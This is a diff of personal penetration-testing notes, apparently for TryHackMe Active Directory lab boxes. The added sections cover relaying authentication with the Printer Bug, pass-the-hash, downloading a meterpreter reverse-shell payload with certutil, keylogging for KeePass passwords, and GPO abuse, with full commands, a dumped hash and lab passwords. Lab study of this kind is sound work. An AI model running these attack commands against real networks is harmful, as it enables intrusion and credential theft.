@@ -379,6 +379,8 @@ Windows get file :
 CMD (1st priority) : 
 ```
 certutil -f -urlcache http://<kali ip>:8000/<which file to download> "<downloaded file name/path>"
+or 
+certutil.exe -urlcache -split -f http://10.150.72.11/shell.exe shell.exe
 ```
 PowerShell : 
 ```
@@ -2763,12 +2765,7 @@ we get a reverse shel back as nt authority\system
 
 #### ==🟢Methodology : ==
 
-AD -> use nxc to find shares, winrm, rdp rights. Get a foothold and set up ligolo. Run bloodhound, check for any outgoing rights, kerberoast, asrep roast, look for sus files that may contain credentials. If nothing, try windows priv esc, if nothing look at other services, maybe a FTP, MSSQL, MySQL or something and see if theres any low hanging fruits. Rinse and repeat till youre DC.
 
-**Tools in my GOAT list**
-1. Ligolo-ng for pivoting and port forwarding, super good
-2. nxc >>> crackmapexec. The wiki is super good, I reckon you could do 90% of boxes if you use nxc well.
-3. bloodhound -> so useful for AD, cant do anything without it
 ###### ==🔵To connect to RDP :==
 
 In username type :
@@ -3164,6 +3161,10 @@ Follow the prompts. It will set up the required database components.
 ###### Start BloodHound
 
 ```
+sudo bloodhound-setup
+```
+
+```
 sudo bloodhound-start
 ```
 Then launch:
@@ -3205,11 +3206,6 @@ neo5j
 ```
 ###### Update BloodHound's Neo4j password
 
-The setup output specifically tells you:
-```
-update /etc/bhapi/bhapi.json
-```
-
 Open it:
 ```
 sudo nano /etc/bhapi/bhapi.json
@@ -3228,10 +3224,10 @@ Ctrl + X
 ```
 sudo bloodhound-start
 ```
-
 If the launcher doesn't automatically open the interface, check:
 ```
 bloodhound
+bloodhound --no-sandbox
 ```
 
 Log in with the default BloodHound account
@@ -3607,17 +3603,231 @@ Just as with PtH, any command run from this shell will use the credentials injec
 
 ### ==🟢Exploitation
 
-#### Exploiting Kerberos Permission Delegation
+#### Exploiting Permission Delegation
 
+ssh into initial user:
+```
+ssh za.tryhackme.loc\\max.smith@thmwrk1.za.tryhackme.loc
+```
+start PowerShell 
+```
+powershell
+```
+###### AddMember (Generic write)
+```
+Add-ADGroupMember "IT Support" -Members "max.smith"
+```
+check if you are added to the group or not
+```
+net group "IT Support" /domain
+```
+you should see your username here 
+###### ForceChangePassword
+now to get the usernames of all the people in the tier2 admins
+```
+Get-ADGroupMember -Identity "Tier 2 Admins"
+```
+select one username 
 
+choose a new password and enter in a variable
+```
+$Password = ConvertTo-SecureString "<New.Password.For.User>" -AsPlainText -Force 
+```
+set it as new password 
+```
+Set-ADAccountPassword -Identity "<AD.Account.Username.Of.Target>" -Reset -NewPassword $Password
+```
 
+Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. You could also run `gpupdate /force` and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.
+```
+gpupdate /force
+```
 
+now login into the new username with the new password we had set
 
 #### Exploiting Automated Relays
 
-#### Exploiting AD Users
+In bloodhound query section (CYPHER) run : 
+This query will attempt to find instances where a computer has the "AdminTo" relationship over another computer.
+```
+`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
+```
+here, server 2 is admin on server 1
+
+
+now well use The Printer Bug 
+for that , first we need to check if these 2 conditions are met or not : 
+1. if the Print Spooler service is running on the final target machine 
+run in PowerShell : 
+```
+GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
+or
+Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc
+```
+2. SMB signing should not be enforced
+on both the targets
+```
+nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc
+```
+both should be `Message signing enabled but not required`
+
+
+now the exploit : 
+Exploiting Authentication Relays
+on kali , start server : 
+put ip of server 1 here
+```
+impacket-ntlmrelayx -smb2support -t smb://<SERVER1 IP> -debug
+```
+
+now on our first machine which we have access of :
+https://github.com/jtmpu/PrecompiledBinaries/blob/master/SpoolSample.exe
+```
+.\SpoolSample.exe THMSERVER2.za.tryhackme.loc <kali ip on which server is running>
+```
+SpoolSample triggers this computer to authenticate to your Kali machine as `THMSERVER2$`.
+
+`ntlmrelayx` receives the authentication attempt and forwards it to THMSERVER1.
+Accepts the relayed authentication if the conditions are met, potentially allowing administrative actions.
+
+on our relay server we get hashesh for admin 
+```
+ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
+```
+from here our ntlm hash is the last one
+```
+3279a0c6dfe15dc3fb6e9c26dd9b066c
+```
+now we login to the server 
+```
+impacket-psexec ServerAdmin@thmserver1.za.tryhackme.loc -hashes :3279a0c6dfe15dc3fb6e9c26dd9b066c
+```
+we get shell 
+
+#### Exploiting AD Users (post-exploitation)
+
+if you already have administrative access to `THMSERVER1`, but now you want to obtain a user's credentials
+
+then introduce two techniques:
+- Credential hunting: Searching for files that contain stored credentials. (Locate a KeePass database `.kdbx` file in a user's directories.)
+- Keylogging: Capturing a user's keystrokes while they interact with the machine.
+
+
+make a reverse shell 
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali ip> LPORT=4444 -f exe -o shell.exe
+```
+now transfer it to server1 where we had NT AUTHORITY\SYSTEM
+```
+python -m http.server 80
+certutil.exe -urlcache -split -f http://10.150.72.11/shell.exe shell.exe
+```
+now on kali start listener (dont change anything here)
+```
+sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 4444; exploit"
+```
+
+now run shell.exe on the server1 where we had NT AUTHORITY\SYSTEM
+```
+.\shell.exe
+```
+we got a shell back 
+```
+meterpreter > 
+```
+
+we enumerate now to find a keypass database
+```
+C:\Users\Administrator.ZA> cd C:\Users\trevor.local\Documents
+C:\Users\trevor.local\Documents> dir
+```
+we find a `PasswordDatabase.kdbx` here
+now see if the file explorer is running
+```
+meterpreter > ps | grep explorer
+Filtering on 'explorer'
+Process List
+============
+ PID   PPID  Name          Arch  Session  User                     Path
+ ---   ----  ----          ----  -------  ----                     ----
+ 3816  3768  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
+```
+migrate to the explorer process of trevor.local
+```
+meterpreter > migrate 3816
+[*] Migrating from 32 to 3816...
+[*] Migration completed successfully.
+```
+we start a keylogger
+```
+meterpreter > keyscan_start
+```
+and after some time dump it
+```
+meterpreter > keyscan_dump
+```
+we get password dumped for the database
+
+now open the database and enter the password
+transfer the database to kali
+sudo apt install keepassx
+```
+keepassxc PasswordDatabase.kdbx
+```
+we enter password dumpted
+
+If we get error : no nothing from keylogger : 
+Gain access to the SERVER1 and establish a meterpreter session
+Reset the password of the user trevor.local
+```
+net user trevor.local Password@123
+```
+RDP with trevor.local to SERVER1
+```
+xfreerdp /v:thmwrk1.za.tryhackme.loc /u:trevor.local /p:Password@123 /cert:ignore /dynamic-resolution
+```
+From the meterpreter session, migrate to the explorer process of trevor.local
+Back to the RDP session, logged in as trevor.local, run the two script found in Documents folder and the executable on the Desktop.
+It might take some time to work (p.s. I am not sure which of the three files does the trick, hence I executed all of them)
+Back on meterpreter shell, check to see if credentials were dumped
 
 #### Exploiting Group Policy Objects (GPOs)
 
+1. In BloodHound, find `svcServMan` and identify its owned GPO.
+2. Confirm the GPO applies to `THMSERVER2`.
+
+RDP into THMWRK1
+```bash
+xfreerdp /v:thmwrk1.za.tryhackme.loc /u:svcServman /p:'Sup3rStr0ngPass\!@' /cert:ignore /dynamic-resolution
+```
+
+Open CMD → Launch MMC
+```cmd
+mmc
+```
+
+Add snap-in: File → Add/Remove Snap-in → Group Policy Management → Add → OK
+
+Navigate to GPO: 
+Servers → Management Servers → Management Server Pushes → Right-click → Edit
+
+Configure Restricted Groups:
+Computer Configuration → Policies → Windows Settings → Security Settings → Restricted Groups → Add Group → `IT Support` → Check Names → OK
+
+Under This group is a member of, add:
+- `Administrators`
+- `Remote Desktop Users`
+Click Apply → OK and wait for the policy to apply.
+
+RDP into THMSERVER2
+```bash
+xfreerdp /v:thmserver2.za.tryhackme.loc /u:lorraine.gill /p:'Tqeq5262' /cert:ignore /smart-sizing
+```
+Verify group membership
+```cmd
+whoami /groups
+```
+
+### ==🟢Persistence==
 
 
